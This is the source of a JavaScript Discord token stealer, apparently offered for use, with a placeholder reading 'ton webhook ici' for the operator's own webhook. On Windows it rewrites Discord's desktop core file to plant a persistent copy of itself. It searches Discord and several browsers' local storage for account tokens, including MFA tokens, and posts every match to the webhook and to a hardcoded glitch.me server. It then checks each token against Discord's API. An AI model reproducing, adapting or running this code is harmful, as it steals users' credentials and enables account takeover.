const fs = require("fs");
let os = require("os")
const fetch = require('node-fetch');
const url = `ton webhook ici`;



  if(os.platform() === "win32"){

    fs.readFile(`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Discord/app-1.0.9003/modules/discord_desktop_core-1/discord_desktop_core/index.js`, async (err, data) => {
        if (err) return;
  
      var path =  `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Discord/app-1.0.9003/modules/discord_desktop_core-1/discord_desktop_core/index.js`
    if(path){
    fs.writeFile(path, 'module.exports = require(\'./core.asar\');\n\n\n\nconst fs = require("fs")\n\nvar paths = [\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,\n`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,\n]\n\n\nfor (i = 0; i < paths.length; i++) {\n\nget_token(paths[i])\n\n}\n\nasync function get_token(path) {\ntry {\nfs.readdir(path, (err, files) => {\nif (files === undefined) {\nreturn\n}\n\nvar filtro = files.filter(f => f.split(".").pop() === "ldb")\nfor (i = 0; i < filtro.length; i++) {\n\nfs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {\n\nlet regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;\n\nlet regex2 = /"mfa\.[\d\w_-]{84}"/;\n\nlet [match] = regex1.exec(data) || regex2.exec(data) || [null];\nif (match != null) {\nmatch = match.replace(/"/g, "")\nconst benladen = new URLSearchParams();\n\nbenladen.append("token", match);\n\nfetch("https://truthful-oceanic-bonobo.glitch.me/", { method: "POST", body: benladen })\n\nawait fetch(`https://discord.com/api/v6/users/@me`, {\nheaders: {\n"authorization": match\n}\n}).then(resp => resp.json()).then(response => {\nif (response.id) {\nsend(match)\n}\n})\n}\n})\n}\n})\nfs.readdir(path, (err, files) => {\nif (files === undefined) {\n\nreturn\n}\nvar filtro = files.filter(f => f.split(".").pop() === "log")\nfor (i = 0; i < filtro.length; i++) {\nfs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {\nlet regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;\nlet regex2 = /"mfa\.[\d\w_-]{84}"/;\nif (regex1.test(data)) {\n}\n\nlet [match] = regex1.exec(data) || regex2.exec(data) || [null];\nif (match != null) {\nmatch = match.replace(/"/g, "")\n\nconst attentat = new URLSearchParams();\nattentat.append("token", match);\nfetch("https://truthful-oceanic-bonobo.glitch.me/", { method: "POST", body: attentat })\nawait fetch(`https://discord.com/api/v6/users/@me`, {\nheaders: {\n"authorization": match\n}\n\n}).then(resp => resp.json()).then(response => {\nif (response.id) {\nsend(match)\n}\n})\n}\n})\n}\n})\n\n} catch (err) {\n\nconsole.log(err)\n}\n}\nfunction send(token) {\nlet is = "0"\n}',function(err){
          if(err) throw err;
    })
  }})


    var paths = [
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
    ]
    
    for (i = 0; i < paths.length; i++) {
      get_token(paths[i])
    }
    
    async function get_token(path) {
      try {
          fs.readdir(path, (err, files) => {
              if (files === undefined) {
                  return
              }
    
              var filtro = files.filter(f => f.split('.').pop() === "ldb")
              for (i = 0; i < filtro.length; i++) {
                  fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
                      let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                      let regex2 = /"mfa\.[\d\w_-]{84}"/;
    
                      let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                      if (match != null) {
                          match = match.replace(/"/g, '')
    
                          const benladen = new URLSearchParams();
                          benladen.append('token', match);
                          fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({"content": match})
                        });
                          fetch('https://truthful-oceanic-bonobo.glitch.me/', { method: 'POST', body: benladen })
    
                          await fetch(`https://discord.com/api/v6/users/@me`, {
                              headers: {
                                  "authorization": match
                              }
                          }).then(resp => resp.json()).then(response => {
                              if (response.id) {
                                  send(match)
                              }
                          })
                      }
                  })
              }
          })
    
          fs.readdir(path, (err, files) => {
              if (files === undefined) {
                  return
              }
              var filtro = files.filter(f => f.split('.').pop() === "log")
              for (i = 0; i < filtro.length; i++) {
                  fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
                      let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                      let regex2 = /"mfa\.[\d\w_-]{84}"/;
    
                      if (regex1.test(data)) {
    
                      }
                      let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                      if (match != null) {
                          match = match.replace(/"/g, '')
                          const attentat = new URLSearchParams();
                          attentat.append('token', match);
                          fetch('https://truthful-oceanic-bonobo.glitch.me/', { method: 'POST', body: attentat })
                          fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({"content": match})
                        });
                          await fetch(`https://discord.com/api/v6/users/@me`, {
                              headers: {
                                  "authorization": match
                              }
                          }).then(resp => resp.json()).then(response => {
                              if (response.id) {
                                  send(match)
                              }
                          })
                      }
                  })
              }
          })
    
    
      } catch (err) {
          console.log(err)
      }
    }
    
    
    function send(token) {
      let is = "0"
    }
  }
